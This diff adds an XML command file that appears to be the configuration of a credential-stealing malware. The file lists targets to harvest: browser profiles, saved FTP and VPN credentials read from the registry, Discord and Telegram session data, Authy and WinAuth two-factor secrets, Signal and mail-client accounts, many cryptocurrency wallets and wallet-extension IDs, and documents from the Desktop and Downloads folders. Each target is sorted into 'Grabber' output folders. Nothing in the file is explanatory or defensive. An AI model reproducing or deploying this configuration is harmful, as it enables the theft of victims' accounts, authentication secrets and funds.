@@ -1,0 +1,343 @@
+<?xml version="1.0" encoding="utf-16"?>
+<Commands xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+  <commands>
+    <command name="2">
+      <args>
+        <string>Mozilla\Firefox</string>
+      </args>
+    </command>
+    <command name="2">
+      <args>
+        <string>Thunderbird</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>Google\Chrome</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>Yandex\YandexBrowser</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>Vivaldi</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>CocCoc\Browser</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>CentBrowser</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>BraveSoftware\Brave-Browser</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>Chromium</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>Microsoft\Edge</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>Opera</string>
+        <string>%AppData%\Opera Software\Opera Stable</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>OperaGX</string>
+        <string>%AppData%\Opera Software\Opera GX Stable</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\dolphin_anty</string>
+        <string>db.json</string>
+        <string>Apps\DolphinAnty</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%USERPROFILE%\OpenVPN\config</string>
+        <string>*\*.ovpn</string>
+        <string>Grabber\OpenVPN</string>
+      </args>
+    </command>
+    <command name="4">
+      <args>
+        <string>SOFTWARE\Martin Prikryl\WinSCP 2\Sessions\*</string>
+        <string>HostName;UserName;Password</string>
+        <string>Apps\WinSCP\sessions.txt</string>
+      </args>
+    </command>
+    <command name="4">
+      <args>
+        <string>SOFTWARE\FTPWare\CoreFTP\Sites\*</string>
+        <string>Host;Port;User;PW</string>
+        <string>Apps\CoreFTP\sessions.txt</string>
+      </args>
+    </command>
+    <command name="4">
+      <args>
+        <string>SOFTWARE\Windscribe\Windscribe2</string>
+        <string>userId;authHash</string>
+        <string>Apps\Windscribe\token.txt</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Authy Desktop\Local Storage\leveldb</string>
+        <string>*</string>
+        <string>Grabber\Authy</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\WinAuth</string>
+        <string>*.xml</string>
+        <string>Grabber\WinAuth</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\obs-studio\basic\profiles</string>
+        <string>*\service.json</string>
+        <string>Apps\OBS</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\FileZilla</string>
+        <string>sitemanager.xml;recentservers.xml</string>
+        <string>Apps\FileZilla</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%LocalAppData%\AzireVPN</string>
+        <string>token.txt</string>
+        <string>Apps\AzireVPN</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%USERPROFILE%\snowflake-ssh</string>
+        <string>session-store.json</string>
+        <string>Apps\Snowflake</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%ProgramFiles(x86)%\Steam</string>
+        <string>ssfn*;config\*.vdf</string>
+        <string>Grabber\Steam</string>
+      </args>
+    </command>
+    <command name="1">
+      <args>
+        <string>Discord</string>
+        <string>%Appdata%\Discord</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%Appdata%\Discord\Local Storage\leveldb</string>
+        <string>*.l??</string>
+        <string>Browsers\Discord\leveldb</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\The Bat!</string>
+        <string>ACCOUNT.???</string>
+        <string>Grabber\The Bat!</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%SystemDrive%</string>
+        <string />
+        <string>Apps\Outlook\credentials.txt</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%SystemDrive%</string>
+        <string>Account.rec0</string>
+        <string>Apps\Foxmail</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Signal</string>
+        <string>config.json;sql\db.sqlite</string>
+        <string>Grabber\Signal</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\.purple</string>
+        <string>accounts.xml</string>
+        <string>Apps\Pidgin</string>
+      </args>
+    </command>
+    <command name="5">
+      <args>
+        <string>Telegram;tdata</string>
+        <string>%AppData%\Telegram Desktop\tdata</string>
+        <string>*s;????????????????\*s</string>
+        <string>Grabber\Telegram</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\ledger live</string>
+        <string>app.json</string>
+        <string>Grabber\Wallets\Ledger</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\atomic\Local Storage\leveldb</string>
+        <string>*.l??</string>
+        <string>Grabber\Wallets\Atomic</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\WalletWasabi\Client\Wallets</string>
+        <string>*.json</string>
+        <string>Grabber\Wallets\Wasabi</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Binance</string>
+        <string>*.json</string>
+        <string>Grabber\Wallets\Binance</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Guarda\Local Storage\leveldb</string>
+        <string>*.l??</string>
+        <string>Grabber\Wallets\Guarda</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%LocalAppData%\Coinomi\Coinomi</string>
+        <string>*.wallet</string>
+        <string>Grabber\Wallets\Coinomi</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Bitcoin\wallets</string>
+        <string>*\*wallet*</string>
+        <string>Grabber\Wallets\Bitcoin</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Electrum\wallets</string>
+        <string>*</string>
+        <string>Grabber\Wallets\Electrum</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Electrum-LTC\wallets</string>
+        <string>*</string>
+        <string>Grabber\Wallets\Electrum-LTC</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Zcash</string>
+        <string>*wallet*dat</string>
+        <string>Grabber\Wallets\Zcash</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Exodus</string>
+        <string>exodus.conf.json;exodus.wallet\*.seco</string>
+        <string>Grabber\Wallets\Exodus</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb</string>
+        <string>.l??</string>
+        <string>Grabber\Wallets\JaxxLiberty</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%AppData%\Jaxx\Local Storage\leveldb</string>
+        <string>.l??</string>
+        <string>Grabber\Wallets\JaxxClassic</string>
+      </args>
+    </command>
+    <command name="3">
+      <args>
+        <string>Metamask</string>
+        <string>nkbihfbeogaeaoehlefnkodbefgpgknn</string>
+      </args>
+    </command>
+    <command name="3">
+      <args>
+        <string>Ronin</string>
+        <string>fnjhmkhhmkbjkkabndcnnogagogbneec</string>
+      </args>
+    </command>
+    <command name="3">
+      <args>
+        <string>BinanceChain</string>
+        <string>fhbohimaelbohpjbbldcngcnapndodjp</string>
+      </args>
+    </command>
+    <command name="3">
+      <args>
+        <string>TronLink</string>
+        <string>ibnejdfjmmkpcnlpebklmnkoeoihofec</string>
+      </args>
+    </command>
+    <command name="3">
+      <args>
+        <string>Phantom</string>
+        <string>bfnaelmomeimhlpmgjnjophhpkkoljpa</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%UserProfile%\Desktop</string>
+        <string>*.txt;*.doc*;*.xls*;*.kbd*;*.pdf</string>
+        <string>Grabber\Desktop Files</string>
+      </args>
+    </command>
+    <command name="0">
+      <args>
+        <string>%UserProfile%\Downloads</string>
+        <string>*.txt;*.doc*;*.xls*;*.kbd*;*.pdf</string>
+        <string>Grabber\Downloads</string>
+      </args>
+    </command>
+    <command name="6"/>
+  </commands>
+</Commands>
